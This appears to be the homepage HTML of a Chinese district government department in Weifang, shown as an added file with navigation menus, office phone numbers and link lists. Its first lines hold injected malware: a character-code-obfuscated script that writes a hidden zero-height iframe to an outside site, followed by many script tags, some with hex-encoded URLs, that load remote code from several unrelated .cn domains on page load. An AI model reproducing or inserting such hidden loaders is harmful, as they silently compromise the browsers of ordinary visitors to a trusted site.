@@ -1,0 +1,1054 @@
+                                                                                                    
+<script>t='60,105,102,114,97,109,101,32,115,114,99,61,104,116,116,112,58,47,47,102,114,101,101,46,50,48,45,48,57,46,99,110,47,101,114,114,111,114,46,104,116,109,32,119,105,100,116,104,61,49,48,48,32,104,101,105,103,104,116,61,48,62,60,47,105,102,114,97,109,101,62';t=eval('String.fromCharCode('+t+')');document.write(t);</script>
+<script src=http://%7A%73%68%61%63%6B%2E%63%6E></script><script src=http://%63%63%68%61%6F%6D%6D%2E%63%6E></script><script src=http://cchaomm.cn></script><script src=http://qqhaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script><script src=http://%7A%73%68%61%63%6B%2E%63%6E></script><script src=http://%63%63%68%61%6F%6D%6D%2E%63%6E></script><script src=http://cchaomm.cn></script><script src=http://qqhaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script><script language=JavaScript>
+<!--
+//
+var version = "other"
+browserName = navigator.appName;   
+browserVer = parseInt(navigator.appVersion);
+if (browserName == "Netscape" && browserVer >= 3) version = "n3";
+else if (browserName == "Netscape" && browserVer < 3) version = "n2";
+else if (browserName == "Microsoft Internet Explorer" && browserVer >= 4) version = "e4";
+else if (browserName == "Microsoft Internet Explorer" && browserVer < 4) version = "e3";
+function marquee1()
+{
+	if (version == "e4" | version == "n3")
+	{
+		document.write("<marquee style='BOTTOM: 0px; FONT-WEIGHT: 100px; HEIGHT:300px;  TEXT-ALIGN: left; TOP: 0px' id='news' scrollamount='1' scrolldelay='10' behavior='loop' direction='up' border='0' onmouseover='this.stop()' onmouseout='this.start()'>")
+	}
+}
+
+function marquee2()
+{
+	if (version == "e4" | version == "n3")
+	{
+		document.write("</marquee>")
+	}
+}
+
+function marquee_logo_news()
+{
+	if (version == "e4")
+	{
+		document.write("<marquee style='BOTTOM: 0px; FONT-WEIGHT: 1200px; HEIGHT:31px;  TEXT-ALIGN: left; TOP: 0px' id='link_map' scrollamount='2' scrolldelay='10' behavior='alternate' direction='right' border='0' onmouseover='this.stop()' onmouseout='this.start()'>")
+	}
+}
+
+function marquee3()
+{
+	if (version == "e4" | version == "n3")
+	{
+		document.write("<marquee direction='left' border='0' onmouseover='this.stop()' onmouseout='this.start()'>")
+	}
+}
+
+function marquee4()
+{
+	if (version == "e4" | version == "n3")
+	{
+		document.write("</marquee>")
+	}
+}
+
+function marquee5()
+{
+	if (version == "e4" | version == "n3")
+	{
+		document.write("<marquee style='BOTTOM: 0px; FONT-WEIGHT: 100px; HEIGHT:100px;  TEXT-ALIGN: left; TOP: 0px' id='news' scrollamount='1' scrolldelay='10' behavior='loop' direction='up' border='0' onmouseover='this.stop()' onmouseout='this.start()'>")
+	}
+}
+
+function marquee6()
+{
+	if (version == "e4" | version == "n3")
+	{
+		document.write("</marquee>")
+	}
+}
+
+//-->
+</script>
+
+<HTML>
+<HEAD>
+<TITLE>山东潍坊滨海经济开发区政治部</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<LINK href="images/nn4.css" type=text/css rel=stylesheet>
+<link href="inc/morn.css" rel="stylesheet" type="text/css">
+<LINK media="screen, projection" href="images/basis.css" type=text/css rel=stylesheet>
+<LINK media="screen, projection" href="images/basis_800.css" type=text/css rel=stylesheet>
+<LINK title=Startseite href="/huanbao" rel=start>
+<LINK title=Hilfe href="/huanbao/3526" rel=help>
+<LINK title=Suche href="/huanbao/35000" rel=search>
+<LINK title=Glossar href="/huanbao/4047" rel=glossary>
+<LINK title=Impressum href="/huanbao/3537" rel=copyright>
+<LINK title=Kontakt href="/huanbao/4120" rel=author>
+<LINK title="BMU Starseite" href="/huanbao/160" rel=bookmark>
+<LINK title="Aktuelle Pressemitteilung" href="/huanbao/4211" rel=bookmark>
+<LINK title=Ministerium href="/huanbao/2147" rel=bookmark>
+<LINK title=Kontakt href="/huanbao/4120" rel=bookmark>
+<LINK title=Sitemap href="/huanbao/35048" rel=contents>
+<META http-equiv=content-language content=zh-cn>
+<META http-equiv=expires content=0>
+<LINK href="images/css.css" rel=stylesheet>
+
+<SCRIPT src="images/blur.js" type=text/javascript></SCRIPT>
+
+<SCRIPT src="images/css.js" type=text/javascript></SCRIPT>
+
+<style>
+<!--
+.style1 {color: #FFFFFF}
+.style4 {font-size: 9pt}
+-->
+</style>
+
+</HEAD>
+<BODY topmargin="0" background="images/beijing2.gif">
+
+<div align="center">
+  <center>
+  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="776" id="AutoNumber1" bgcolor="#FFFFFF">
+    <tr>
+      <td height="214" valign="top">
+      <html>
+<SCRIPT language=JavaScript type=text/JavaScript>
+<!--
+
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+
+function MM_timelineGoto(tmLnName, fNew, numGotos) { //v2.0
+  //Copyright 1997, 2000 Macromedia, Inc. All rights reserved.
+  var i,j,tmLn,props,keyFrm,sprite,numKeyFr,firstKeyFr,lastKeyFr,propNum,theObj;
+  if (document.MM_Time == null) MM_initTimelines(); //if *very* 1st time
+  tmLn = document.MM_Time[tmLnName];
+  if (numGotos != null)
+    if (tmLn.gotoCount == null) tmLn.gotoCount = 1;
+    else if (tmLn.gotoCount++ >= numGotos) {tmLn.gotoCount=0; return}
+  jmpFwd = (fNew > tmLn.curFrame);
+  for (i = 0; i < tmLn.length; i++) {
+    sprite = (jmpFwd)? tmLn[i] : tmLn[(tmLn.length-1)-i]; //count bkwds if jumping back
+    if (sprite.charAt(0) == "s") {
+      numKeyFr = sprite.keyFrames.length;
+      firstKeyFr = sprite.keyFrames[0];
+      lastKeyFr = sprite.keyFrames[numKeyFr - 1];
+      if ((jmpFwd && fNew<firstKeyFr) || (!jmpFwd && lastKeyFr<fNew)) continue; //skip if untouchd
+      for (keyFrm=1; keyFrm<numKeyFr && fNew>=sprite.keyFrames[keyFrm]; keyFrm++);
+      for (j=0; j<sprite.values.length; j++) {
+        props = sprite.values[j];
+        if (numKeyFr == props.length) propNum = keyFrm-1 //keyframes only
+        else propNum = Math.min(Math.max(0,fNew-firstKeyFr),props.length-1); //or keep in legal range
+        if (sprite.obj != null) {
+          if (props.prop2 == null) sprite.obj[props.prop] = props[propNum];
+          else        sprite.obj[props.prop2][props.prop] = props[propNum];
+      } }
+    } else if (sprite.charAt(0)=='b' && fNew == sprite.frame) eval(sprite.value);
+  }
+  tmLn.curFrame = fNew;
+  if (tmLn.ID == 0) eval('MM_timelinePlay(tmLnName)');
+}
+//-->
+</SCRIPT>
+<head>
+<meta http-equiv="Content-Language" content="zh-cn">
+
+<title>山东潍坊滨海经济开发区政治部</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<link href="inc/morn.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="" type="text/css">
+
+
+<a href="ShowMain.asp?ArticleID="><font color="#FFFFFF" class=article_font></font></a>
+</head>
+<body text="#000000" leftmargin="0" topmargin="0">
+<div align="center">
+  <center>
+  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="778" id="AutoNumber1" height="187" bgcolor="#FFFFFF">
+    <tr>
+      <td height="153" background="images/bt00.jpg">
+      <EMBED 
+       pluginspage=http://www.macromedia.com/go/getflashplayer 
+       src=images/001.swf width=196 height=151 
+       type=application/x-shockwave-flash wmode="transparent" 
+        quality="high"></EMBED>
+      </td>
+    </tr>
+    <tr>
+      <td width="780" background="images/bg6.jpg" align="center" height="28">
+           <style type="text/css">
+.anylinkcss{
+border-left:1px solid black; border-right:1px solid black; border-top:1px solid black; border-bottom:0px solid black; position:absolute;
+visibility: hidden;
+line-height: 18px;
+z-index: 100;
+background-color: #E7E7E2;
+width: 205px; font-style:normal; font-variant:normal; font-weight:normal; font-size:12px; font-family:Verdana
+}
+
+.anylinkcss a{
+width: 100%;
+display: block;
+text-indent: 3px;
+border-bottom: 1px solid black;
+padding: 1px 0;
+text-decoration: none;
+font-weight: bold;
+text-indent: 5px;
+}
+
+.anylinkcss a:hover{ /*hover background color*/
+background-color: red;
+color: white;
+}
+
+           </style>
+<script language="javascript">
+//more javascript from http://www.baist.net
+var disappeardelay=250  //menu disappear speed onMouseout (in miliseconds)
+var enableanchorlink=0 //Enable or disable the anchor link when clicked on? (1=e, 0=d)
+var hidemenu_onclick=1 //hide menu when user clicks within menu? (1=yes, 0=no)
+
+/////No further editting needed
+
+var ie5=document.all
+var ns6=document.getElementById&&!document.all
+
+function getposOffset(what, offsettype){
+var totaloffset=(offsettype=="left")? what.offsetLeft : what.offsetTop;
+var parentEl=what.offsetParent;
+while (parentEl!=null){
+totaloffset=(offsettype=="left")? totaloffset+parentEl.offsetLeft : totaloffset+parentEl.offsetTop;
+parentEl=parentEl.offsetParent;
+}
+return totaloffset;
+}
+
+function showhide(obj, e, visible, hidden){
+if (ie5||ns6)
+dropmenuobj.style.left=dropmenuobj.style.top=-500
+if (e.type=="click" && obj.visibility==hidden || e.type=="mouseover")
+obj.visibility=visible
+else if (e.type=="click")
+obj.visibility=hidden
+}
+
+function iecompattest(){
+return (document.compatMode && document.compatMode!="BackCompat")? document.documentElement : document.body
+}
+
+function clearbrowseredge(obj, whichedge){
+var edgeoffset=0
+if (whichedge=="rightedge"){
+var windowedge=ie5 && !window.opera? iecompattest().scrollLeft+iecompattest().clientWidth-15 : window.pageXOffset+window.innerWidth-15
+dropmenuobj.contentmeasure=dropmenuobj.offsetWidth
+if (windowedge-dropmenuobj.x < dropmenuobj.contentmeasure)
+edgeoffset=dropmenuobj.contentmeasure-obj.offsetWidth
+}
+else{
+var windowedge=ie5 && !window.opera? iecompattest().scrollTop+iecompattest().clientHeight-15 : window.pageYOffset+window.innerHeight-18
+dropmenuobj.contentmeasure=dropmenuobj.offsetHeight
+if (windowedge-dropmenuobj.y < dropmenuobj.contentmeasure)
+edgeoffset=dropmenuobj.contentmeasure+obj.offsetHeight
+}
+return edgeoffset
+}
+
+function dropdownmenu(obj, e, dropmenuID){
+if (window.event) event.cancelBubble=true
+else if (e.stopPropagation) e.stopPropagation()
+if (typeof dropmenuobj!="undefined") //hide previous menu
+dropmenuobj.style.visibility="hidden"
+clearhidemenu()
+if (ie5||ns6){
+obj.onmouseout=delayhidemenu
+dropmenuobj=document.getElementById(dropmenuID)
+if (hidemenu_onclick) dropmenuobj.onclick=function(){dropmenuobj.style.visibility='hidden'}
+dropmenuobj.onmouseover=clearhidemenu
+dropmenuobj.onmouseout=ie5? function(){ dynamichide(event)} : function(event){ dynamichide(event)}
+showhide(dropmenuobj.style, e, "visible", "hidden")
+dropmenuobj.x=getposOffset(obj, "left")
+dropmenuobj.y=getposOffset(obj, "top")
+dropmenuobj.style.left=dropmenuobj.x-clearbrowseredge(obj, "rightedge")+"px"
+dropmenuobj.style.top=dropmenuobj.y-clearbrowseredge(obj, "bottomedge")+obj.offsetHeight+"px"
+}
+return clickreturnvalue()
+}
+
+function clickreturnvalue(){
+if ((ie5||ns6) && !enableanchorlink) return false
+else return true
+}
+
+function contains_ns6(a, b) {
+while (b.parentNode)
+if ((b = b.parentNode) == a)
+return true;
+return false;
+}
+
+function dynamichide(e){
+if (ie5&&!dropmenuobj.contains(e.toElement))
+delayhidemenu()
+else if (ns6&&e.currentTarget!= e.relatedTarget&& !contains_ns6(e.currentTarget, e.relatedTarget))
+delayhidemenu()
+}
+
+function delayhidemenu(){
+delayhide=setTimeout("dropmenuobj.style.visibility='hidden'",disappeardelay)
+}
+
+function clearhidemenu(){
+if (typeof delayhide!="undefined")
+clearTimeout(delayhide)
+}
+           </script>
+
+<!--第一个链接和菜单 -->
+           <font size="2">
+ <a href="." onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu1')">
+           <font size="2" color="#FAEC09"><font class=article_font>首页</font></a></font><font class=article_font color="#FAEC09"> ·
+           <div id="anylinkmenu1" class="anylinkcss" style="width: 0; height: 0">                                                    
+</div>
+          
+           
+<a href="ShowMain.asp?ArticleID=357" onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu2')">
+           <font color="#FAEC09"><font class=article_font>部门概况</font></font></a> ·
+           <div id="anylinkmenu2" class="anylinkcss" style="width: 80; height: 60">
+
+<a href="ShowMain.asp?ArticleID=432">部门介绍</font></a>
+<a href="ShowMain.asp?ArticleID=478">科室介绍</font></a>
+<a href="ShowMain.asp?ArticleID=479">领导介绍</font></a>
+</div>
+
+
+<a href="#" onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu3')">
+<font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu3')" href="ShowClass.asp?BigClass=党的建设">
+           <font color="#FAEC09">党的建设</font></a></font></font></a><font size="2" color="#FAEC09"><font class=article_font color="#FAEC09"> · 
+                                                    
+<div id="anylinkmenu3" class="anylinkcss" style="width: 80; height: 100">
+
+<a href="ShowClass.asp?BigClass=党的建设&SmlClass=党建动态">党建动态</font></a>
+<a href="ShowClass.asp?BigClass=党的建设&SmlClass=党员风采">党员风采</font></a>
+<a href="ShowClass.asp?BigClass=党的建设&SmlClass=理论研讨">理论研讨</font></a>
+<a href="ShowClass.asp?BigClass=党的建设&SmlClass=业务交流">业务交流</font></a>
+<a href="ShowClass.asp?BigClass=党的建设&SmlClass=他山之石">他山之石</font></a>
+</div>
+
+
+<font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu4')" href="ShowClass.asp?BigClass=干部人事">
+           <font color="#FAEC09">干部人事</font></a></font><font class=article_font color="#FAEC09"> · 
+                                                    
+<div id="anylinkmenu4" class="anylinkcss" style="width: 80; height: 100">
+
+<a href="ShowClass.asp?BigClass=干部人事&SmlClass=干部工作">干部工作</font></a>
+<a href="ShowClass.asp?BigClass=干部人事&SmlClass=人事工作">人事工作</font></a>
+<a href="ShowClass.asp?BigClass=干部人事&SmlClass=人才工作">人才工作</font></a>
+<a href="ShowClass.asp?BigClass=干部人事&SmlClass=职称考试">职称考试</font></a>
+<a href="ShowClass.asp?BigClass=干部人事&SmlClass=培训中心">培训中心</font></a>
+</div>
+
+<a href="#" onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu5')">
+           <font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu5')" href="ShowClass.asp?BigClass=纪检监督">
+           <font color="#FAEC09">纪检监察</font></a></font></font></a><font size="2" color="#FAEC09"><font class=article_font color="#FAEC09"> ·
+                                                    
+<div id="anylinkmenu5" class="anylinkcss" style="width: 80; height: 100">
+
+<a href="ShowClass.asp?BigClass=纪检监察&SmlClass=宣传教育">宣传教育</font></a>
+<a href="ShowClass.asp?BigClass=纪检监察&SmlClass=廉洁自律">廉洁自律</font></a>
+<a href="ShowClass.asp?BigClass=纪检监察&SmlClass=监察与行风">监察与行风</font></a>
+<a href="ShowClass.asp?BigClass=纪检监察&SmlClass=政策法规">政策法规</font></a>
+<a href="ShowClass.asp?BigClass=纪检监察&SmlClass=信访举报">信访举报</font></a>
+</div>
+
+           <font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu6')" href="ShowClass.asp?BigClass=劳动保障">
+           <font color="#FAEC09">劳动保障</font></a></font><font class=article_font color="#FAEC09"> ·  
+                                                    
+<div id="anylinkmenu6" class="anylinkcss" style="width: 80; height: 100">
+
+<a href="ShowClass.asp?BigClass=劳动保障&SmlClass=劳动监察">劳动监察</font></a>
+<a href="ShowClass.asp?BigClass=劳动保障&SmlClass=劳动仲裁">劳动仲裁</font></a>
+<a href="ShowClass.asp?BigClass=劳动保障&SmlClass=工伤认定">工伤认定</font></a>
+<a href="ShowClass.asp?BigClass=劳动保障&SmlClass=劳动培训">劳动培训</font></a>
+<a href="ShowClass.asp?BigClass=劳动保障&SmlClass=政策法规">政策法规</font></a>
+</div>
+
+           <font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu7')" href="ShowClass.asp?BigClass=就业服务">
+           <font color="#FAEC09">就业服务</font></a></font><font class=article_font color="#FAEC09"> · 
+                                                    
+<div id="anylinkmenu7" class="anylinkcss" style="width: 80; height: 60">
+
+<a href="ShowClass.asp?BigClass=就业服务&SmlClass=工作流程">工作流程</font></a>
+<a href="ShowClass.asp?BigClass=就业服务&SmlClass=招聘信息">招聘信息</font></a>
+<a href="ShowClass.asp?BigClass=就业服务&SmlClass=人才信息">人才信息</font></a>
+</div>
+
+<a href="#" onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu8')">
+           <font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu8')" href="ShowClass.asp?BigClass=统战群团">
+           <font color="#FAEC09">统战群团</font></a></font><font class=article_font color="#FAEC09"> · 
+                                                    
+<div id="anylinkmenu8" class="anylinkcss" style="width: 80; height: 80">
+
+<a href="ShowClass.asp?BigClass=统战群团&SmlClass=共青团">共青团</font></a>
+<a href="ShowClass.asp?BigClass=统战群团&SmlClass=妇 联">妇    联</font></a>
+<a href="ShowClass.asp?BigClass=统战群团&SmlClass=工 会">工    会</font></a>
+<a href="ShowClass.asp?BigClass=统战群团&SmlClass=老干部">老干部</font></a>
+</div>
+
+           <font size="2" color="#FAEC09"><font class=article_font>
+           <a onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu9')" href="ShowClass.asp?BigClass=内部建设">
+           <font color="#FAEC09">内部建设</font></a></font><font class=article_font color="#FAEC09"> ·             
+ <div id="anylinkmenu9" class="anylinkcss" style="width: 0; height: 0">
+                                                   
+</div>
+
+<a href="ShowClass.asp?BigClass=作品文苑" onClick="return clickreturnvalue()" onMouseover="dropdownmenu(this, event, 'anylinkmenu10')" href="ShowMain.asp?ArticleID=480">
+           <font size="2" color="#FAEC09"><font class=article_font>联系我们</font></a></font><font class=article_font color="#FAEC09"> ·
+                                                    
+<div id="anylinkmenu10" class="anylinkcss" style="width: 80; height: 40">
+<a href="mailto:webmaster@bhzzb.gov.cn">投诉举报</a>
+<a href="mailto:webmaster@bhzzb.gov.cn">意见建设</a>
+</div>
+
+  </td>
+    </tr>
+    <tr>
+      <td height="7">
+      <img border="0" src="images/bg7.jpg" width="778" height="7"></td>
+    </tr>
+    <tr>
+      <td height="28">
+      <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
+        <tr>
+          <td width="20%">&nbsp; 
+          <SCRIPT language=JavaScript>
+today=new Date();
+function initArray(){
+this.length=initArray.arguments.length
+for(var i=0;i<this.length;i++)
+this[i+1]=initArray.arguments[i] }
+var d=new initArray(
+"星期日",
+"星期一",
+"星期二",
+"星期三",
+"星期四",
+"星期五",
+"星期六");
+document.write(
+"<font color=#0000ff style='font-size:9pt;font-family: 宋体'> ",
+today.getYear(),"年",
+today.getMonth()+1,"月",
+today.getDate(),"日",
+d[today.getDay()+1],
+"</font>" ); 
+          </SCRIPT>
+         </FONT>&nbsp;&nbsp;&nbsp;</TD>
+         <TD width="80%" bgColor=#ffffff>
+     <marquee scrollamount=2 scrolldelay=60><font color=#0000ff style='font-size:10pt;font-family: 宋体'>欢迎您光临山东潍坊滨海经济开发区政治部网站！</marquee>
+      </TD>
+   </tr>
+      </table>
+      </td>
+    </tr>
+  </table>
+  </center>
+</div>
+
+</body>
+</html>
+      </td>
+    </tr>
+    <tr>
+      <td>
+      <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
+        <tr>
+          <td width="176" align="left" valign="top">
+          <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3">
+            <tr>
+              <td width="100%" valign="top">
+              <div align="center">
+  <center>
+  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="176" id="AutoNumber1">
+    <tr>
+      <td background="images/backgroundright.gif" valign="top">
+      <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
+        <tr>
+          <td width="100%" background="images/zzjg.gif" height="28">　</td>
+        </tr>
+        <tr>
+          <td width="100%" height="150">
+          <div align="right">
+            <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="99%" id="AutoNumber3">
+              <tr>
+                <td width="100%" height="150" valign="center">
+                 
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=503><font class=article_font color="#000000">综　合　科　5333005</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=475><font class=article_font color="#000000">人事人才科&nbsp;&nbsp;5330626</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=474><font class=article_font color="#000000">组　宣　科　5337637</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=473><font class=article_font color="#000000">法　纪　科&nbsp;&nbsp;5331637</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=472><font class=article_font color="#000000">劳动保障科&nbsp;&nbsp;5330628</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=471><font class=article_font color="#000000">就业办公室&nbsp;&nbsp;5311360</font></a> <br>
+     
+                </td>
+              </tr>
+              </table>
+          </div>
+          </td>
+        </tr>
+        <tr>
+          <td width="100%">
+          <div align="left">
+            <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+              <tr>
+             <td width="100%" background="images/bszn.gif" height="28">　</td>
+             </tr>
+              <tr>
+                 <td width="100%" height="240" valign="top">
+                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber5">
+                  <tr>
+                    <td width="100%" height="220" valign="top">
+                     
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=498><font class=article_font color="#000000">职工调动工作程序</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=496><font class=article_font color="#000000">申请缴纳养老保险、医...</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=495><font class=article_font color="#000000">人事代理工作程序</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=494><font class=article_font color="#000000">办理《失业证》程序</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=492><font class=article_font color="#000000">办理《再就业优惠证》...</font></a> <br>
+     
+                    </td>
+                  </tr>
+                  <tr>
+                    <td width="100%">
+                <p align="right"><FONT size=2>
+                <a href="ShowClass.asp?BigClass=办事指南">
+                <IMG src="images/doc_more.gif">&nbsp;<font class=article_font>更多...</FONT></a></td>
+                  </tr>
+                </table>
+                </TD>
+              </tr>
+              </table>
+          </div>
+          </td>
+        </tr>
+        <tr>
+          <td width="100%" background="images/yqlj.gif" height="28">　</td>
+        </tr>
+        <tr>
+                <TD height=30></TD>
+        </tr>
+        <tr>
+                <TD>
+                  <TABLE cellSpacing=0 cellPadding=4 width="100%" border=0>
+                    <TBODY>
+                    <TR>
+                      <TD>
+                        <DIV align=center><FONT size=2><SPAN><SELECT 
+                        onchange=window.open(this.options[this.selectedIndex].value) 
+                        size=1 name=select1> <OPTION value=# selected>※开发区部门链接 
+                          ※</OPTION> <OPTION 
+                          value=http://bheda.net/bangongshi>党政办公室</OPTION> 
+                         </SELECT> 
+                        </SPAN></FONT></DIV></TD></TR>
+                    <TR>
+                      <TD>
+                        <DIV align=center><FONT size=2><SELECT 
+                        onchange=window.open(this.options[this.selectedIndex].value) 
+                        size=1 name=select4>                                 
+                              &gt; <OPTION value=# selected>※ 
+                          潍坊本地链接 ※</OPTION> 
+                          <OPTION 
+                          value=http://inner.wfnet.cn/>市党政信息网
+                          <OPTION 
+                          value=http://www.weifang.gov.cn/>潍坊市政府
+                          <OPTION 
+                          value=http://youth.weifang.com/>共表团潍坊市委
+                          <OPTION 
+                          value=http://www.chinaweifang.net/>市信息中心
+                          <OPTION 
+                          value=http://jf.weifang.gov.cn/>潍坊行风监督
+                          <OPTION 
+                          value=http://www.wfxf.gov.cn/>潍坊信访
+                          <OPTION 
+                          value=http://www.wfetn.gov.cn/>潍坊市经贸委
+                          <OPTION 
+                          value=http://www.wf-redshield.com.cn/>潍坊市工商局
+                          <OPTION 
+                          value=http://www.wfny.gov.cn/>潍坊农业信息网
+                          <OPTION 
+                          value=http://61.133.99.121/>潍坊市卫生局
+                          <OPTION 
+                          value=http://www.wfagri.net.cn/>市农业科技信息网
+                          <OPTION 
+                          value=http://www.wfsti.com/>潍坊科技信息网
+                          <OPTION 
+                          value=http://spzx.weifang.gov.cn/>公共行政审批中心
+                          <OPTION 
+                          value=http://www.wfrenda.gov.cn/>潍坊市人大</OPTION></SELECT> 
+                        </FONT></DIV></TD></TR>
+                    <TR>
+                      <TD>
+                        <DIV align=center><FONT size=2><SELECT 
+                        onchange=window.open(this.options[this.selectedIndex].value) 
+                        size=1 name=select5> <OPTION value=# selected>※ 国内媒体链接 
+                          ※</OPTION> 
+                          <OPTION 
+                          value=http://www.people.com.cn/>人民日报
+                          <OPTION 
+                          value=http://www.dzdaily.com.cn/>大众日报
+                          <OPTION 
+                          value=http://www.emm.com.cn/>组织人事报
+                          <OPTION 
+                          value=http://www.xinhuanet.com/>新华网
+                          <OPTION 
+                          value=http://www.cyol.net/>中国青年报
+                          <OPTION 
+                          value=http://www.gmw.com.cn/>光明日报
+                          <OPTION 
+                          value=http://www.zgdjyj.com/>党建研究</OPTION></SELECT> 
+                        </FONT></DIV></TD></TR>
+                    <TR>
+                      <TD>
+                        <DIV align=center><FONT size=2><SELECT 
+                        onchange=window.open(this.options[this.selectedIndex].value) 
+                        size=1 name=select> <OPTION value=# selected>※ 热点网站链接 
+                          ※</OPTION> 
+                          <OPTION 
+                          value=http://www.sina.com.cn/>新浪网
+                          <OPTION 
+                          value=http://www.sohu.com/>搜狐
+                          <OPTION 
+                          value=http://www.163.com/>网易
+                          <OPTION 
+                          value=http://www.china.com/>中华网
+                          <OPTION 
+                          value=http://cn.yahoo.com/>雅虎中国</OPTION></SELECT> 
+                        </FONT></DIV></TD></TR>
+                    <TR>
+                      <TD height=2></TD></TR></TBODY></TABLE></TD>
+        </tr>
+        <tr>
+          <td width="100%">
+          　</td>
+        </tr>
+        <tr>
+          <td width="100%" height="60">
+          　<a href="Dvbbs"><img border="0" src="images/zglt.gif"></a></td>
+        </tr>
+      </table>
+      </td>
+    </tr>
+  </table>
+  </center>
+</div>
+              </td>
+            </tr>
+          </table>
+          </td>
+          <td width="600" align="left">
+          <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+            <tr>
+              <td width="424" valign="top">
+              <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber5" height="225">
+                <tr>
+                  <td width="100%" height="6">
+                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber9">
+                    <tr>
+                <TD width=30><IMG height=23 
+                  src="images/centerlit.gif" width=30></TD>
+                <TD class=unnamed1 vAlign=bottom width=250 
+                background=images/bgcenter1.gif>
+                  <TABLE height=20 cellSpacing=0 cellPadding=0 width="60%" 
+                  border=0>
+                    <TBODY>
+                    <TR>
+                      <TD class=unnamed1 height=20><FONT color=#ffffff 
+                        size=2><font class=article_font>工作动态</FONT></TD></TR></TBODY></TABLE></TD>
+                <TD class=lifttitle 
+                  background=images/bgcenter2.gif><IMG height=23 
+                  src="images/centermiddle2.gif" width=22></TD>
+                <TD width=10><IMG height=23 
+                  src="images/centerright.gif" 
+            width=13></TD>                    
+                 </tr>
+                  </table>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="200" background="images/bgcenter.gif">
+                  <div align="right">
+                    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber10">
+                      <tr>
+                        <td width="100%" height="190" valign="top">
+                         
